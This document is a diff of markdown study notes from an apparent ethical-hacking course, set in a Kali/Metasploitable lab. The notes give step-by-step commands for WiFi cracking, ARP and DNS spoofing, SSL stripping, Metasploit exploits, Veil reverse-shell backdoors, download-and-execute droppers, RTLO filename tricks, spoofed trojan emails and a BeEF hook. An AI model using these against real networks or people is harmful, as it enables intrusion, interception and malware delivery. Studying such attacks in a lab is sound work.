@@ -1,32 +1,36 @@
 # Notes
 
 ## Lab
-- VirtualBox - https://www.virtualbox.org/wiki/Downloads
+
+- VirtualBox - <https://www.virtualbox.org/wiki/Downloads>
 - Install VM VirtualBox Extension Pack - Support for USB 2.0 and USB 3.0 devices
-- custom kali linux -> https://zsecurity.org/download-custom-kali/
+- custom kali linux -> <https://zsecurity.org/download-custom-kali/>
   - Network -> NATNetwork
-  - How To Fix Nat Network Issue In Virtual Box -> https://www.youtube.com/watch?v=y0PMFg-oAEs
-  - https://zsecurity.org/got-a-blank-screen-after-importing-kali-in-virtual-box-heres-how-to-fix-it/
-  - Installing Kali 2017.1 In Virtual Box In Less Than 3 Minutes -> https://www.youtube.com/watch?v=TU-TgF_UnAI
+  - How To Fix Nat Network Issue In Virtual Box -> <https://www.youtube.com/watch?v=y0PMFg-oAEs>
+  - <https://zsecurity.org/got-a-blank-screen-after-importing-kali-in-virtual-box-heres-how-to-fix-it/>
+  - Installing Kali 2017.1 In Virtual Box In Less Than 3 Minutes -> <https://www.youtube.com/watch?v=TU-TgF_UnAI>
   - save snapshot after first setup
-  - kali tools doc -> https://tools.kali.org/tools-listing
-  - windows VM -> https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/
+  - kali tools doc -> <https://tools.kali.org/tools-listing>
+  - windows VM -> <https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/>
   - wireless adapter -> VM settings -> ports -> select usb controller -> add
   - ifconfig -> will show newly added adapter (ex: wlan0)
 - Windows as Virtual machine:
-  - https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/
+  - <https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/>
 
 # Network Penetration Testing/Hacking
+
 - Pre Connection attack
 - Gaining Access
 - Post connection attack
 
 ## change Mac address
+
 - Increase anonymity
 - Impersonate other devices
 - Bypass filters
 - steps:
-```
+
+```txt
   - ifconfig (look for the newly added adapter, ex: wlan0), need to change the ether field
   - disable network -> ifconfig wlan0 down
   - ifconfig waln0 hw ether 11:22:33:44:55
@@ -36,9 +40,11 @@
 ```
 
 ## Change to Monitor mode
+
 - by default device only listens data which has the mac address in destination fields of the messages
 - capture all the data transferred in the air within range by changing to Monitor mode
 - steps:
+
 ```
   - iwconfig -> to see wireless interface only
   - by default mode is Managed mode
@@ -51,13 +57,16 @@
 ```
 
 # Pre-connection attack
+
 ## Packet Sniffing (Using Airodump-ng)
+
 - Part of the aircrack-ng suit.
 - Airodump-ng is a packet sniffer;
 - Used to capture all packets within range.
 - Display detailed info about networks around us.
 - Connected clients ….etc
 - use:
+
 ```
   - check network interfere name -> iwconfig
   - airodump-ng [MonitorModeInterface]
@@ -68,10 +77,12 @@
 ```
 
 ## Network Hacking - Sniffing data for single Network device
+
 ```
 - airodump-ng mon0
 - airodump-ng -bssid FC:15:B4:00:00:00 --channel 2 --write test mon0
 ```
+
 - details:
   - sniff data from specific bssid : FC:15:B4:00:00:00
   - listen data on channel : 2
@@ -80,21 +91,25 @@
 - wireshark -> open test-01.cap file
 
 ## Deauthentication Attack
+
 - Disconnect any client from any network
 - Works on encrypted networks (WEP, WPA & WPA2).
 - No need to know the network key.
 - No need to connect to the network.
 - use:
+
 ```
   - aireplay-ng --deauth [#DeauthPackets] -a [NetworkMac] -c [TargetMac] [Interface]
   - aireplay-ng --deauth 10000000 -a FC:15:B4:00:00:00 -c FF:FF:FF:00:00:00 mon0
   - https://tools.kali.org/wireless-attacks/aireplay-ng
 ```
+
 - theory:
   - Impersonate as client to access point(router) to Disconnect (by changeing self mac to client mac)
   - Impersonate as access point(router) to client to disconnect on client request (changing mac to router's mac)
 
 ## Gaining Access - WEP Cracking
+
 - details:
   - Wired equivalent Privacy
   - Old encryption, uses RC4 algorithm
@@ -122,6 +137,7 @@
   - Solution:
     - Force the AP to generate new IVs (Fake Authentication and ARP Request Replay)
 - steps:
+
 ```
   - airodump-ng -bssid FC:15:B4:00:00:00 --channel 1 --write basic_wep mon0
   - aircrack-ng basic_wep-01.cap
@@ -129,9 +145,11 @@
 ```
 
 ## Fake Authentication Attack
+
 - If network is not busy -> we need Force the AP(Access Point) to generate new IVs (Fake Authentication)
 - we need to associate to the Network (tell the network that we want to communicate with it, by default access point ignore requests they get unless the device is connected to them or associated with it)
 - command:
+
 ```
   - monitor -> airodump-ng -bssid FC:15:B4:00:00:00 --channel 1 --write arp_replay mon0
   - run attack -> aireplay-ng --fakeauth 0 -a FC:15:B4:00:00:00 -h 11:22:33:44:55:55 mon0
@@ -141,6 +159,7 @@
 ```
 
 ## WEP Cracking - ARP Request Replay Attack
+
 - run airodump-ng againest the target network
 - command -> airodump-ng -bssid FC:15:B4:00:00:00 --channel 1 --write arp_replay mon0
 - associate with target network with Fake Authentication  
@@ -158,6 +177,7 @@
 - aircrack-ng may require more IV packets
 
 ## Introduction WPA and WPA2 Cracking
+
 - Both can be cracked using the same methods
 - Made to address the issues in WEP.
 - Much more secure.
@@ -165,6 +185,7 @@
 - Packets contain no useful information.
 
 ## WPA / WPA2 Cracking - Exploiting WPS (Cracking without Wordlist)
+
 - WPS is a feature that can be used with WPA & WPA2.
 - Allows clients to connect without the password.
 - Authentication is done using an 8 digit pin.
@@ -174,6 +195,7 @@
 - PS: This only works if the router is configured not to use PBC (Push Button
 Authentication).
 - process:
+
 ```
 # tool to check all the networks around me with WPS enabled
 $ wash --interface [NetworkInterfaceInMonitorMode]
@@ -189,6 +211,7 @@ $reaver --bssid [TargetNetworkMacAddr] --channel [TargetNetworkChannel] --interf
 ```
 
 ## WPA / WPA2 Cracking - NO WPS enabled (Cracking with Wordlist)
+
 - Packets contain no useful data
 - Only packets that can aid with the cracking process are the handshake
 packets.
@@ -209,14 +232,19 @@ not.
 - we matches our generated MIC with retrieved MIC
 - MIC is used by access point to verifiy if password is correct or not
 - **Capturing the WPA / WPA2 handshape**
+
 ```
 airodump-ng -bssid [TargetNetworkMacAddr] --channel [TargetNetworkChannel] --write [output_file_name] [MonitorModeInterface]
 # now wait for new clients to connect to capture the handshake
 # or do De-authentication attack on a client so that when it reconnects, we'll capture the handshake
 # handshake will be stored in output_file
+
 ```
+
 - Some wordlist:
+
 ```
+
 ftp://ftp.openwall.com/pub/wordlists/
 http://www.openwall.com/mirrors/
 https://github.com/danielmiessler/SecLists
@@ -228,7 +256,9 @@ http://www.cotse.com/tools/wordlists1.htm
 http://www.cotse.com/tools/wordlists2.htm
 http://wordlist.sourceforge.net/
 ```
+
 - Creating a Wordlist:
+
 ```
 Crunch can be used to create a wordlist.
 Syntax:
@@ -240,24 +270,30 @@ aaaaab
 aabbbb
 aan$$b
 ```
+
 - cracking using aircrack-ng:
+
 ```
 $aircrack-ng output_file.cap -w wordlist.txt
 #handshake is stored in output_file.cap
 #WordLists is stored in wordlist.txt
 ```
+
 - Note: social Engineering (evil twin attacks) can be used to get the password from a client
 
 # Post Connection attack
 
 ## Information gathering
+
 - Discovering Devices connected to same network:
+
 ```
 netdisconver -i [wiredinterface] -r 10.0.2.1/24
 # will discover all IPs from 10.0.2.1 to 10.0.2.254
 netdisconver -i [wirelessinterface] -r 192.168.0.1/24
 # will discover all IPs from 192.168.0.1 to 192.168.0.254
 ```
+
 - Network Mapping (NMap), HUGE security scanner.
 - From an IP/IP range it can discover:
   - Open ports.
@@ -268,6 +304,7 @@ netdisconver -i [wirelessinterface] -r 192.168.0.1/24
 - run -> **zenmap**
   - put ip or ip range in target
   - profile- > details in scan
+
 ```
 Hack: iPhone have no ssh open until jailbroken
 username -> root
@@ -276,19 +313,24 @@ most user doesn't know or care to change.
 ```
 
 ## ARP Protocol
+
 Simple protocol used to map IP Address of a machine to its MAC address
+
 - all communicate require a source mac addr and destination mac addr
 - device A who wants to communicate with device code B
 - device A broadcast an ARP request to all the device in same network, to get the mac address to a certain IP
 - all device ignore and only the device with request IP responds with its MAC Address
 - No verification of mac is done by requesting entity
 - each computer maintain a table which link the ip addresses to mac addresses
+
   ```
   $ arp -a
   ```
 
 ## MITM Attack (Man in the middle attack)
+
 any request/response to access point goes through hacker computer, can be achieved with ARP Poisoning
+
 - we can exploit the ARP protocol
 - send two requests:
   - one to access point, saying I'm the client
@@ -297,11 +339,13 @@ any request/response to access point goes through hacker computer, can be achiev
 - Reason: no verification is done for response
 
 ## ARP Spoofing (Using arpspoof)
+
 - arpspoof tool to run arp spoofing attacks.
 - Simple and reliable.
 - Ported to most operating systems including Android and iOS.
 - Usage is always the same.
 - use:
+
   ```
   #run these commands in two shells
   arpspoof -i [interface] -t [clientIP] [gatewayIP]
@@ -314,6 +358,7 @@ any request/response to access point goes through hacker computer, can be achiev
   ```
 
 ## ARP Spoofing (Using MITMf and Bettercap)
+
 - Framework to run MITM attacks.
 - Can be used to :
   - ARP Spoof targets (redirect the flow of packets)
@@ -323,14 +368,19 @@ any request/response to access point goes through hacker computer, can be achiev
   - Inject code in loaded pages.
   - And more!
 - mitmf use:
+
 ```
 mitmf --arp --spoof -i [interface] --target [clientIP] --gateway [gatewayIP]
 ```
+
 - bettercap use (will be using this mostly ):
+
 ```
 bettercap -iface [interface]
 ```
+
 ## Bettercap
+
 - get help -> bettercap --help
 - a new prompt will open on command -> bettercap -iface [interface]
 - type **help** to see list of modules and commands
@@ -350,24 +400,29 @@ bettercap -iface [interface]
 - capturing all data and analysing by Bettercap
   - module -> net.sniff : anything flows through computer will be captured and analysed by this module
   - net.sniff on
-- http://vulnweb.com : http sites for testingf
+- <http://vulnweb.com> : http sites for testingf
 
 ## ARP Spoofing (Create script - caplet):
+
 - caplet : text file that contains all the commands
 write all the command to a file and save as file_name.cap:
+
 ```
 net.probe on
 set arp.spoof.fullduplex true
 set arp.spoof.target 192.168.0.4
 arp.spoof on
-set net.sniff.local true      
+set net.sniff.local true
 net.sniff on
 ```
+
 - net.sniff.local : sniff all data even if its local data (in https bettercap will thinks that data is of its been sent from our own computer)
 - bettercap -iface wlan0 -caplet file_name.cap
 
 ## HTTPS and bypass by bettercap
+
 Problem:
+
 - Data in HTTP is sent as plain text.
 - A MITM can read and edit requests and responses. → not secure
 Solution:
@@ -376,6 +431,7 @@ Solution:
 - Encrypt HTTP using TLS (Transport Layer Security) or SSL (Secure Sockets Layer).
 
 **Bypass HTTPS:** <br>
+
 - Problem: Most websites use HTTPS → Sniffed data will be encrypted.
 - Solution: Downgrade HTTPS to HTTP.
 - bettercap provide the caplet to downgrade HTTPS to HTTP
@@ -383,6 +439,7 @@ Solution:
 - extract it in directory /usr/share/bettercap/caplets/ (delete existing one there)
 
 **Downgrade HTTPS to HTTP.** (SSL Stripping) <br>
+
 ```
 - bettercap -iface wlan0 -caplet start_spoof.cap    ---------> (start_spoof.cap if caplet we created above to start sniffing)
 - type name of caplet to run ----> hstshijack/hstshijack
@@ -390,32 +447,38 @@ Solution:
 
 **HSTS** <br>
 Modern web browsers comes with a list of websites that they should only load over https like facebook, twitter etc
+
 - browser's doing this check locally, nothing can be done by MITM
 **ByPass HSTS** <br>
 - Trick the browser into loading a different website
 - replace all links for HSTS websites with similar links
   - Ex: facebook.com -> facebook.corn
 - using hsts caplet to bypass it added in repository -> hstshijack.cap
+
   ```
   set hstshijack.targets              -> hsts websites
   set hstshijack.replacement          -> replacements for target websites
   set hstshijack.Payload              -> js file for code injection
   ```
+
 - running the attack:
+
 ```
 bettercap -iface wlan0 -caplet start_spoof.cap
 hstshijack/hstshijack
 ```
+
 - if doesn't work, means site is cached, try after removing browsing Data
 - will not work url is directly entered in the search bar, user needs to search the target website on search engine (let's say google.in) and then click on the link from search result to work the hsts bypassing
 - script will work in background and replace all link to target website in search result
 - Link to onw issue: HSTS Hijack caplet dial tcp error
-  - https://www.youtube.com/watch?v=XoUPHF-wyMc&feature=youtu.be
+  - <https://www.youtube.com/watch?v=XoUPHF-wyMc&feature=youtu.be>
 - bettercap V2.23:
-  - https://ufile.io/joxjzflg
+  - <https://ufile.io/joxjzflg>
   - alternate added in repository
 
 ## DNS Spoofing (Controlling DNS Requests on the Network) - MITM
+
 - DNS → Domain Name System.
   - Translates domain names to IP addresses.
   - request for website goes to DNS, will in result return the IP of the server
@@ -426,6 +489,7 @@ hstshijack/hstshijack
 - doesn't work against hsts websites
 
 **Redirecting to Local web server for a DNS request**
+
 ```
 ## start local webserver (kali linux comes with default)
 $ service apache2 start
@@ -440,6 +504,7 @@ $ set dns.spoof.all true
 $ set dns.spoof.domains google.com,*.google.com
 $ dns.spoof on
 ```
+
 - use:
   - replace login page with fake page
   - redirect to another website with malware
@@ -447,7 +512,9 @@ $ dns.spoof on
 
 
 ## Injecting Javascript code (MITM)
+
 Inject Javascript/HTML code in loaded pages
+
 - Code gets executed by the target browser
   - → use the --inject plugin
 - Code can be :
@@ -461,6 +528,7 @@ Inject Javascript/HTML code in loaded pages
   4. Hook target browser to exploitation Framework
   5. and more!!
 - process:
+
 ```
 # take simple Javascript file and save as alert.js:
   alert('Javascript test');
@@ -473,11 +541,12 @@ Inject Javascript/HTML code in loaded pages
 $ bettercap -iface wlan0 -caplet start_spoof.cap
 # start hstshijack plugin
 ```
+
 - limitation:
   - works against http and https (downgraded to http) and only work with hsts when bypassed
 
-
 ## wireshark Tool
+
 - it is network protocol analyser
 - Designed to help network administrators to keep track of what happening in their network
 - How does it works?
@@ -499,9 +568,9 @@ $ bettercap -iface wlan0 -caplet start_spoof.cap
     - hypertext Transfer Protocol contains form data (in POST request : login info etc )
   - right click a packet and : Follow > HTTP Stream --> Follow the stream and response of the request
 
-
 ## Creating a Fake Access Point (Honeypot) -
-Hacker machine having any interface with internet Access (most likely via NATNetwork) and it's wireless adapter broadcasting signal in AP mode (behaving like a router): <br>
+
+Hacker machine having any interface with internet Access (most likely via NATNetwork) and it's wireless adapter broadcasting signal in AP mode (behaving like a router): </br>
 Any device connected to it will be victim of MITM attack
 
 - **Using Mana-Toolkit** : Tools run rogue access point attacks.
@@ -533,12 +602,12 @@ Any device connected to it will be victim of MITM attack
   - if error occur first time kill the command and run it again
   - do not test it from host machine as Fake access point is using internet from Host machine (NATNetwork), test it from another VM or another device (ex: phone)
 
+## Detecting/Prevention ARP Poisoning Attacks
 
-## Detecting/Prevention ARP Poisoning Attacks:
- - run command: arp -a
-  - check if some other device in your network has same mac address as your router
- - use  tool  to detect : http://www.xarp.net/#download
- - **Using wireshark to detect suspicious activities in network**
+- run command: arp -a
+- check if some other device in your network has same mac address as your router
+- use  tool  to detect : <http://www.xarp.net/#download>
+  - **Using wireshark to detect suspicious activities in network**
   - wireshark -> preference -> protocols -> arp/rarp -> enable detect ARP request storms
   - give the device which is trying to discover all the device in the network and give notification
   - to verify : run command from another device : netdisconver
@@ -557,7 +626,9 @@ Any device connected to it will be victim of MITM attack
     - HTTPS Everywhere plugin can be used with VPN (VPN provider can not see data over HTTPS)
 
 # Gaining Access to Computer devices
-any electronic device <br>
+
+any electronic device </br>
+
 - **Server Side Attacks**
 - Do not require user interaction, all we need is a target IP
 - starts with information gathering, find open ports, installed services and work from there
@@ -571,10 +642,11 @@ any electronic device <br>
 # Gaining Access - Server Side Attacks
 
 ## Installing Metasploitable as a Virtual Machine
+
 - this machine will act as a server (victim that we will attack)
 - Metasploitable is a vulnerable linux distro, this OS contains a number of vulnerabilities
 - it is designed for penetrators to try and hack it
-- download page: https://information.rapid7.com/download-metasploitable-download.html
+- download page: <https://information.rapid7.com/download-metasploitable-download.html>
 - Steps:
   - extract zip
   - add new VM in Virtual box -> linux : ubuntu64
@@ -586,6 +658,7 @@ any electronic device <br>
 - Netowrk configuration as NATNetwork
 
 ## Introduction : Server side Attacks
+
 - Need an IP address.
 - Very simple if target is on the same network (netdiscover or zenmap).
 - If target has a domain, then a simple ping will return its IP.
@@ -604,9 +677,11 @@ any electronic device <br>
     - ex: vsftpd v2.3.4 backdoor command execution
 
 ## Server Side Attack - METASPLOIT
+
 Metasploit is an exploit development and execution tool. It can also be used
 to carry out other penetration testing tasks such as port scans, service
 identification and post exploitation tasks.
+
 ```
  > msfconsole - runs the metasploit console
  > help - shows help
@@ -615,7 +690,9 @@ identification and post exploitation tasks.
  > set [option] [value] - configure [option] to have a value of [value]
  > exploit - runs the current task
 ```
+
 - example:
+
 ```
 # we went to zenmap, found the service vsftpd v2.3.4 and googled it
 # we found a vulnerability at https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor as :
@@ -631,11 +708,13 @@ msf exploit(vsftpd_234_backdoor) > exploit
 ## now you're in target machine console, verify with:
 > uname -a
 ```
+
 - RHOST is usually target machine, from where the connection is coming From
 - LHOST is usually hacker machine, to where the request is transferred
 - Payloads are small piece of code that are executed on target machine once the vulnerability is exploited, payload will further do something to do something like gaining control
 - **payload example**: for samba 3.x exploit ->
 - SAMBA "USERNAME MAP SC  RIPT" COMMAND EXECUTION
+
 ```
 msf > use exploit/multi/samba/usermap_script
 msf exploit(usermap_script) > show options
@@ -648,47 +727,55 @@ msf exploit(usermap_script) > set LPORT PORT_HACKER_MACHINE      -----> listenin
 msf exploit(usermap_script) > show options
 msf exploit(usermap_script) > exploit
 ```
+
 - bind payload, open a port on target computer and we connect to that port
 - reverse payload, do opposite, open port on hacker machine and connect from target machine to hacker machine (allow us to bypass firewall, as connection going outside from target machine)
 - LPORT PORT_HACKER_MACHINE can be set to 80 or 8080, never filtered by firewall as this port is used by webservers
 
 ## Server Side Attack - Metasploit community
+
 Metasploit community is a GUI that can discover open ports and installed
 services on the target machine, not only that but it maps these services
 to metasploit modules and exploits and allow us to run these modules
 from the web GUI.
+
 - steps:
   1. Download it from https://www.rapid7.com/products/metasploit/metasploit-community-registration.jsp
   2. Change permissions to executable. > chmod +x [installer file name]
   3. Run installer > ./[installer file name]
   4. Once complete, metasploit community can be started as a service.
+
   ```
    > service metasploit start
   ```
+
   5. Now navigate to https://localhost:3790 and enter your product key.
 
 ## Server Side Attacks - Nexpose
+
 Nexpose is a vulnerability management framework,
+
 - it allows us to discover, assess and act on discovered vulnerabilities,
 - it also tells us a lot of info about the discovered vulnerabilities, weather they are exploitable
 - and helps us write a report at the end of the assessment.
 - might not work on kali 3 (nexpose-rolling-hack.txt attached in the repository)
 - steps:
-  1. Download it from http://www.rapid7.com/products/nexpose/compare-downloads.jsp
+  1. Download it from <http://www.rapid7.com/products/nexpose/compare-downloads.jsp>
   2. Stop postgresql > service postgresql stop
   3. Change permissions to executable. > chmod +x [installer file name]
   4. Run installer > ./[installer file name]
   5. enter valid email, key will be sent to it. username and password will be used to login
 
 ## Nexpose : Scanning a target server for vulnerabilities
+
 - make sure database comes with kali linux if stopped. because nexpose use its own database and both running on same port might conflict
   - service postgresql stop
 - go to nexpose directory:
   - cd /opt/rapid7/nexpose/
 - run nexpose: -----> (running it for first time might take time as it will do some configuration)
-  - ./nsc.sh              
+  - ./nsc.sh
 - go to url:
-  - https://localhost:3780/
+  - <https://localhost:3780/>
 - login with username and password
 - Enter the product key sent to your email address
 - Creating a project:
@@ -710,9 +797,11 @@ Nexpose is a vulnerability management framework,
   - different level of reports can be generated
 
 ***
+
 # Gaining Access - Client Side Attacks
 
 ## Introduction : Client side Attacks
+
 - Use if server side attacks fail OR If IP is probably useless
 - if target is hidden behind a router
 - it Require user interaction (open a link, picture, pdf etc)
@@ -720,37 +809,41 @@ Nexpose is a vulnerability management framework,
 - Information gathering is vital (not only the services, but websites used by target, email, friends etc)
 
 ## Client side Attacks : Installing Veil Framework
+
 - a backdoor is a file that gives us full control over the machine that it gets executed on
 - backdoor can be caught by anti-virus programs
 - Viel is framework for generating *Undetectable* backdoors
-- https://github.com/Veil-Framework/Veil
+- <https://github.com/Veil-Framework/Veil>
 
-**Generating an undetectable backdoor using - Veil-Evasion** <br>
-1. Install veil-evasion > apt-get install veil-evasion  
-  - (on install *apt-get install veil*-> it has two tools evasion and Ordance)
-  1. Evasion : generates backdoors
-  2. Ordance : Generate Payloads
+**Generating an undetectable backdoor using - Veil-Evasion** </br>
+
+1. Install veil-evasion > apt-get install veil-evasion
+    - (on install *apt-get install veil*-> it has two tools evasion and Ordance)
+    1. Evasion : generates backdoors
+    2. Ordance : Generate Payloads
 2. Run veil-evasion > veil-evasion
-  - (or run *veil* > list > use 1   --->(Evasion))
+    - (or run *veil* > list > use 1   --->(Evasion))
 3. Select a backdoor/payload > use [payload number]
-  - command to see available payloads > list
+    - command to see available payloads > list
 4. Set options > set [option] [value]
 5. Generate backdoor > generate
-- INFO:
-  - Payloads are divided into 3 parts: FIRST/SECOND/THIRD   (General naming patterns)
+    - INFO:
+    - Payloads are divided into 3 parts: FIRST/SECOND/THIRD   (General naming patterns)
     1. FIRST: Programming language payloads is written in
     2. SECOND: type of the payload  
-      - ex: meterpreter: payload designed my metasploit, it runs in memory and allow us to migrate between system processes, ex: explorer. it doesn't leave a footprint so hard to detect
+        - ex: meterpreter: payload designed my metasploit, it runs in memory and allow us to migrate between system processes, ex: explorer. it doesn't leave a footprint so hard to detect
     3. THIRD: method that's gonna be used to establish the connection
       - ex: rev_https.py : creates reverse https connection
       - reverse: connection is gonna come from target computer to hacker computer
       - able to bypass firewall/anti-virus in reverse connection
+
 - Example:
+
 ```
 > Veil
 > list  
 > use 1       --------> (Select Evasion)
-> list   
+> list
 > use 15        --------> (go/meterpreter/rev_https.py)
 # it will show payload info and options
 # LHOST and LPORT is the ip address and port we'll be listening connection on . i.e. our computer ip
@@ -773,7 +866,9 @@ Nexpose is a vulnerability management framework,
 # keep veil up to date
 # Start listening to connections before sending backdoor
 ```
+
 **Backdooring exe’s**
+
 1. Run veil-evasion > veil-evasion
 2. Select a generic/backdoor_factory > use [payload number]
 3. Set options > set [option] [value]
@@ -782,20 +877,22 @@ Nexpose is a vulnerability management framework,
 
 **Listening for connections : Run hander**  <br>
 For above backdoor to work, we need to open a port to listen any connection on that port
+
 - we'll use metasploit framework to listen connections
-1. Run metasploit > msfconsole
-2. Use handler module. > use exploit/multi/handler
-3. Set payload > set PAYLOAD [veil payload]   --- TARGET/TYPE/METHOD
-4. Set ip > set LHOST [your ip]
-5. Set port > set LPORT [veil port]
-6. exploit > exploit
+    1. Run metasploit > msfconsole
+    2. Use handler module. > use exploit/multi/handler
+    3. Set payload > set PAYLOAD [veil payload]   --- TARGET/TYPE/METHOD
+    4. Set ip > set LHOST [your ip]
+    5. Set port > set LPORT [veil port]
+    6. exploit > exploit
 - example:
-```
+
+```txt
 $ msfconsole
 > use exploit/multi/handler
 > set PAYLOAD windows/meterpreter/reverse_https
 > show options
-> set LHOST 10.0.2.14    
+> set LHOST 10.0.2.14
 > set LPORT 8080    ---->(on 80, we'll running our webserver to deliver backdoor)
 > exploit
 ##################################################
@@ -804,6 +901,7 @@ $ msfconsole
 ```
 
 ## Basic Backdoor delivery method : WINDOWS 10 (Just to verify backdoor)
+
 - copy the .exe file generate using veil
   - **from** /var/lib/veil-evasion/output/compiled/file_name.exe
   - **to**  /var/www/html/_create_a_folder_here_/file_name.exe
@@ -812,11 +910,12 @@ $ msfconsole
   - service apache2 start
 - start **listening to connections** using msfconsole
 - go to url from your target Machine
-  - http://IP_ADDR_HACKER_MACHINE/__FOLDER_NAME_FROM_ABOVE_STEP__/
+  - <http://IP_ADDR_HACKER_MACHINE/>__FOLDER_NAME_FROM_ABOVE_STEP__/
 - download and execute exe
 
 ## Client Side Attacks : Backdoor delivery method 1 - Spoofing Software Updates
--  Fake an update for an already installed program.
+
+- Fake an update for an already installed program.
 - Install backdoor instead of the update.
 - Requires DNS spoofing + Evilgrade (a server to serve the update)
 - You need to be MITM
@@ -839,32 +938,35 @@ $ msfconsole
       - exploit
 
 ## Client Side Attacks : Backdoor delivery method 2 - backdooring exe download
+
 - Backdoor any exe the target downloads.
 - We need to be in the middle of the connection.
 - Tool : Backdoor Factory Proxy (find installation steps in repository folder : backdoor-factory-proxy)
 - steps:  
   1. edit bdfproxy config -> leafpad /opt/bdfproxy/bdfproxy.cfg
-    - Set IP address to your IP in config.
-      - look for [[[WindowsIntelx86]]]  and [[[WindowsIntelx64]]]  --> your target Machine
-      - HOST = YOUR_IP_ADDRESS
-      - Change Proxy mode : proxyMode = transparent
+      - Set IP address to your IP in config.
+        - look for [[[WindowsIntelx86]]]  and [[[WindowsIntelx64]]]  --> your target Machine
+        - HOST = YOUR_IP_ADDRESS
+        - Change Proxy mode : proxyMode = transparent
   2. Start bdfproxy. > bdfproxy.py    (program as soon as receive a request it backdoors that program)
   3. Redirect traffic to bdfproxy.  
-    - iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
-  4. Start listening for connections    
-    - msfconsole -r /opt/bdfproxy/bdfproxy_msf_resource.rc
-    - or it may be at path : /usr/share/bdfproxy/bdf_proxy_msf_resource.rc
+      - iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+  4. Start listening for connections
+      - msfconsole -r /opt/bdfproxy/bdfproxy_msf_resource.rc
+      - or it may be at path : /usr/share/bdfproxy/bdf_proxy_msf_resource.rc
   5. Start arp spoofing.  
-    - Bettercap -Tq -M arp:remote -i [interface] /[Gatewaay IP]// /Target IP/
+      - Bettercap -Tq -M arp:remote -i [interface] /[Gatewaay IP]// /Target IP/
   6. When done reset ip tables rules. > ./flushiptables.sh
 
 ## Protection against : Client Side Attacks
+
 - Ensure you're not being MITMed -> use trusted network, xarp etc
 - Only download from https pages
 - check file MD5 after download:
-  - http://www.winmd5.com/
+  - <http://www.winmd5.com/>
 
 ## Gaining access : Client Side Attacks - Social Engineering
+
 - with previous Client Side attacks you need to be MITM to gain access
 - With social engineering you can get attack remotely
 - Gather Info about the user(s)
@@ -872,6 +974,7 @@ $ msfconsole
 - Build a backdoor based on the info
 
 ## Maltego - Information Gathering Tool
+
 - Maltego is an information gathering tool that can be used to collect information about ANYTHING
 - Target can be website, company, person etc
 - Discover entities associated with targets
@@ -887,26 +990,28 @@ $ msfconsole
   - you can add social Networks
   - fill the details in right block (property view)
   - entities -> manage entities -> add entities -> advance settings -> add palette item (like twitter)
-- Fix Maltego 4.0 Not Starting : https://www.youtube.com/watch?v=6MaidZjmbjk&feature=youtu.be
+- Fix Maltego 4.0 Not Starting : <https://www.youtube.com/watch?v=6MaidZjmbjk&feature=youtu.be>
 
 ## Backdooring any file type (images, pdf etc)
+
 - Combine backdoor with any file - Generic solution.
 - Users are more likely to run a pdf, image or audio file than an executable.
 - Works well with social engineering.
 - The idea is to convert the original (pdf, jpg, mp3) file to an exe, then combine it with a backdoor using veil-evasion.
-  1. Download Autoit from https://www.autoitscript.com/site/autoit/downloads/
+  1. Download Autoit from <https://www.autoitscript.com/site/autoit/downloads/>
   2. Install it. > wine [downloaded file]
   3. Download the run script from resources : **autoit-download-and-execute.txt** (rename file Extension from .txt. to .au3)
   4. Place original file in the same directory as the script.
   5. Set original file name in the script.
   6. set url1 to file like jpg (online accessible) file url nad url2 -> path of exe (online accessible)
-    - ex: $urls = "http://www.somedomain.com/da/picture.jpg,http://10.20.14.213:/files/rev_https_8080.exe"
+      - ex: $urls = "http://www.somedomain.com/da/picture.jpg,http://10.20.14.213:/files/rev_https_8080.exe"
   7. Generate exe using Autoit script to exe converter.
   8. Tool : Aut2Exe  -> select script, executable and icon
   9. before downloading from client side, start listening connection using metasploit :
-    - **see : Listening for connections : Run hander**
+  - **see : Listening for connections : Run hander**
 
 ## Spoofing backdoor extension
+
 - Change extension of the trojan from exe to a suitable one.
 - Make the trojan even more trustable.
 - We will use an old trick using the “right to left overload” character.
@@ -915,12 +1020,12 @@ $ msfconsole
   3. Search for U+202E
   4. Copy character.
   5. Rename trojan and in the following format -> trojan[RTLO]fdp.exe
-    - Where RTLO is the copied character and “fdp” is the reverse of the extension that
-you want to use.
+    (Where RTLO is the copied character and “fdp” is the reverse of the extension that you want to use.)
   6. it will become : trojan[RTLO]fdp.exe --> trojanexe.pdf
 - archive the file so that browser will not replace RTLO character
 
 ## Spoofing Emails Method 1- setting up SMTP server (Trojan delivery method)
+
 - objective:
   - Use gathered info to contact target.
   - Send an email pretending to be a friend.
@@ -933,7 +1038,8 @@ you want to use.
 - Sign up to be SMTP web server, will give better results
   - ex: www.sendinblue.com
 - Kali Program can be used to send email via SMTP server : **sendemail**
-```
+
+```txt
  > sendemail --help
  > sendemail -xu USERNAME -xp PASSWORD -s SERVER:PORT -f SEND_EMAIL_FROM_THIS_USER_EMAIL_ID -t SEND_TO_THIS_EMAIL_ID -u SUBJECT -m TEXT_MESSAGE_WITH_LINK_TO_TROJAN
  # Trojan can be uploaded to dropbox for downloading
@@ -942,7 +1048,9 @@ you want to use.
  > use advance option --->  -o message-header="From: FIRST_NAME SECOND_NAME <NAME@email.com>"
  to message to look like sent from actual user
 ```
+
 ## Spoofing Emails Method 2
+
 - web hosting platform . ex: 000webhost.com
 - setup account
 - upload file : mailer.php (added in repository)
@@ -950,25 +1058,27 @@ you want to use.
 - fill form and submit
 
 ## BeEF : Browser exploitation Framework
+
 - Browser exploitation Framework allowing us to launch a number of attacks on a hooked target
 - targets are hooked once they load a hook url
-    - DNS spoof requests to a page containing the hook code ```(<script>)```
-    - Inject the hook in browsed pages (need to be MITM)
-    - Use XSS exploit
+  - DNS spoof requests to a page containing the hook code ```(<script>)```
+  - Inject the hook in browsed pages (need to be MITM)
+  - Use XSS exploit
     - Social Engineer the target to open a hook page
-  - start with: **beef start**
-  - first time it will ask to set a password for default user
-  - use credentials:
-    - username: beef
-    - password : set by user
-  - online browser : hooked to beef right now (you can control)
-  - offline browser : browsers previously connected
-  - to browser to get hook, specific javascript code need to executed
-    - can be seen on beef console
-    - hook code is : ```<script src="http://127.0.0.1;3000/hook.js"></script>```
-  - work against all browser that runs Javascript
-  - example:
-  ```
+- start with: **beef start**
+- first time it will ask to set a password for default user
+- use credentials:
+  - username: beef
